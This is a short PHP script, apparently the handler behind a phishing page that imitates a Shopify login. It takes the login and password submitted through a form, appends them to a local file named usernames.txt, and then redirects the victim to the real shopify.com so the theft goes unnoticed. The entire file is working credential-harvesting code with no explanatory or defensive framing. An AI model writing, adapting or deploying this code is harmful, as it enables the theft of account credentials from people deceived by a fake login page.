<?php

file_put_contents("usernames.txt", "Account: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://shopify.com');
exit();
